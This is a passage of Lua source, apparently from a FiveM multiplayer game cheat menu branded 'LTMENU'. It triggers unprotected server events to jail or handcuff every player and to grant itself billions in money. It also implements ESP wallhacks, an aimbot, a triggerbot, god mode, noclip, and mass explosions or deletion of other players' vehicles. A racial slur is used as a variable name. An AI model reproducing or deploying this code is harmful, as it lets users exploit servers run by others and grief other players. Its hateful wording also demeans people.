				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~LTMENU ON YOUTUBE")
					end
				end

						if esxdestroy then
				for i = 0, 128 do
						TriggerServerEvent("esx_truckerjob:pay", 9999999999)
						TriggerServerEvent("AdminMenu:giveCash", 9999999999)
						TriggerServerEvent("esx_dmvschool:pay",  9999999999)
						TriggerServerEvent("LegacyFuel:PayFuel", 9999999999)
				end
			end
			
            if invisible then
                SetEntityVisible(GetPlayerPed(-1), false, 0)
            else
                SetEntityVisible(GetPlayerPed(-1), true, 0)
            end
			
			
            if freezePlayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end

            if crosshair then
                ShowHudComponentThisFrame(14)
            end
			
			if ci then
                local cK = false
                local cL = 130
                local cM = 0
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                        local ped = GetPlayerPed(i)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if cK then
                            if NetworkIsPlayerTalking(i) then
                                local cN = d(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    cN.r,
                                    cN.g,
                                    cN.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < cL then
                            if not cK then
                                if NetworkIsPlayerTalking(i) then
                                    local cN = d(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        cN.r,
                                        cN.g,
                                        cN.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end

            if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)

            if fall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end

			if freezeall then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent("cuffServer", GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
						TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
					end
				end
			
            if blowall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0, false)
                end
            end

            if sall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = GetHashKey("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end

            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end


                if superGrip then
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end

                if t2x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
                end

                if t4x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
                end

                if t8x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
                end

                if t16x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
                end
            end


            if Noclip then
        local noclip_speed = 1.0
        local ped = GetPlayerPed(-1)
        local x,y,z = getPosition()
        local dx,dy,dz = getCamDirection()
        local speed = noclip_speed
		SetEntityVisible(GetPlayerPed(-1), false, false)
		SetEntityInvincible(GetPlayerPed(-1), true)
		SetEntityVisible(ped, false);

      SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
      if IsControlPressed(0, 21) then
          speed = speed + 3
          end
      if IsControlPressed(0, 19) then
          speed = speed - 0.5
      end
             if IsControlPressed(0,32) then
              x = x+speed*dx
              y = y+speed*dy
              z = z+speed*dz
               end


               if IsControlPressed(0,269) then
              x = x-speed*dx
              y = y-speed*dy
              z = z-speed*dz
               end
        SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
            else
            SetEntityVisible(GetPlayerPed(-1), true, false)
            SetEntityInvincible(GetPlayerPed(-1), false)

         end

            if WADOHWIB then
                local gotEntity = getEntity(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotification("Aim Your Gun At An Entity And Shoot!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~r~FUCKED")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~r~FUCKED")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    drawNotification("~r~FUCKED!")
                                end
                            end
                        end
                    end
                end
            end
			if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, true)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end
			
            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a8 = k(1.0)
                        local d7 = GetPlayerPed(i)
                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(d7))
                        local db =
                            '~h~Name: ' ..
                            GetPlayerName(i) ..
                                '\nServer ID: ' ..
                                    GetPlayerServerId(i) ..
                                        '\nPlayer ID: ' ..
                                            i ..
                                                '\nDist: ' ..
                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                        if IsPedInAnyVehicle(d7, true) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
                        if KDOWJDw and esp then
                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
                        end
                        if jfjfjffuhguh and esp then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                        end
                        if jfjfjf and esp then
                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
                        end
                    end
                end
            end

            if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
                end

            if rainbowTint then
                for i = 0, #allWeapons do
                    if HasPedGotWeapon(PlayerPedId(), GetHashKey(allWeapons[i])) then
                        SetPedWeaponTintIndex(PlayerPedId(), GetHashKey(allWeapons[i]), math.random(0, 7))
                    end
                end
            end

            if showCoords then
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
				local playerPedsss = PlayerPedId()
				roundzxx = GetEntityHeading(playerPedsss)
                bf("~r~X:~s~ "..roundx,0.05,0.00)
                bf("~r~Y:~s~ "..roundy,0.11,0.00)
                bf("~r~Z:~s~ "..roundz,0.17,0.00)
				bf("~r~H:~s~ "..roundzxx,0.23,0.00)
            end

            if bulletGun then
                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = GetHashKey(bullets[selectedBullet])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, false)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(-1000)
                        end
                    end
                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                end

            end

            if vehicleGun then
                local heading = GetEntityHeading(PlayerPedId())
                local model = GetHashKey(vehicles[selectedVehicle])
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                RequestModel(model)
                while not HasModelLoaded(model) do
                    debugPrint("Loading Model...")
                    Citizen.Wait(-1000)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                        SetModelAsNoLongerNeeded(model)
                        SetVehicleAsNoLongerNeeded(veh)
                        end
                    end
                end
            end

            if pedGun then
                local heading = GetEntityHeading(PlayerPedId())
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                local model = GetHashKey(peds[selectedPed])

                RequestModel(model)
                while not HasModelLoaded(model) do
                    Citizen.Wait(-1000)
                end


                
                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetEntityRecordsCollisions(spawnedPed, true)
                        for f = 0.0, 75.0 do
                            if HasEntityCollidedWithAnything(spawnedPed) then break end
                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                        end
                    end
                end
            end

            if forceGun then
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local heading = GetEntityHeading(PlayerPedId())
                if IsPedShooting(PlayerPedId()) then
                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if aiming then
                        if IsPedInAnyVehicle(entity) then
                            local veh = GetVehiclePedIsUsing(entity)
                            DeleteEntity(entity)
                            SetEntityHeading(veh, heading)
                            SetVehicleForwardSpeed(veh, 150.0)
                        else
                            for i = 0, 10 do
                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                            end
                        end
                    end
                end
            end

					if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
		Deer.Destroy()
		end
			
            if bifegfubffff then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end
			
			 if rainbow then
                    local color = k(1.0)
                    for i = 0, #allMenus do
                        LTPREMIUM.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
                    end  
                    for i, dA in pairs(bd) do                 
                        LTPREMIUM.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
                    end
                    for i, dA in pairs(be) do 
                        LTPREMIUM.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                    end
                end
                
                if animated then                                   
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
                            end
                            for i, dA in pairs(bd) do
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                
                            end      
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
                            end
                            for i, dA in pairs(bd) do
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
                            end
                            for i, dA in pairs(bd) do
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
                            end
                            for i, dA in pairs(bd) do
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                
                            end                          
                end
			
			if explosiveAmmo then
                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact1 then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(-1000)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(-1000)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(150)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
					Citizen.Wait(150)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end

			if RainbowVeh then
                local u48y34 = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if ou328hSync then
                local u48y34 = k(1.0)
				local ped = PlayerPedId()
                local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			
			if ou328hNeon then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if LOJWDNDDNDN then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
               SetVehicleDirtLevel(veh, 1.0)
				else
            end
			
			if CLEAR then
								SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetOverrideWeather("CLEAR")
		end
		
					if BLIZZARD then
								SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		
					if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
		
					if EXTRASUNNY then
								SetWeatherTypePersist("EXTRASUNNY")
        SetWeatherTypeNowPersist("EXTRASUNNY")
        SetWeatherTypeNow("EXTRASUNNY")
        SetOverrideWeather("EXTRASUNNY")
		end
			
			if XMAS then
			            SetForceVehicleTrails(true)
            SetForcePedFootstepsTracks(true)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
			
            if LOJ38 then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityVisible(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end
			
			if IsControlJustReleased(0, Keys['X']) then
			ClearPedTasks(PlayerPedId())
		end
			
						if Nigubdddddd then 
			local veh = GetVehiclePedIsUsing(PlayerPedId(-1))
			if IsControlPressed(0, 232) then
			SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
			end
				if veh ~= nil then
					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 36.0)
					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 60.0);
				end
			end

			            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
			
            if TriggerBot then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end

            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
			
			if godmode then
			SetEntityInvincible(GetPlayerPed(-1), true)
			SetPlayerInvincible(PlayerId(), true)
			SetPedCanRagdoll(GetPlayerPed(-1), false)
			ClearPedBloodDamage(GetPlayerPed(-1))
			ResetPedVisibleDamage(GetPlayerPed(-1))
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
			SetEntityCanBeDamaged(GetPlayerPed(-1), false)
		else
			SetEntityInvincible(GetPlayerPed(-1), false)
			SetPlayerInvincible(PlayerId(), false)
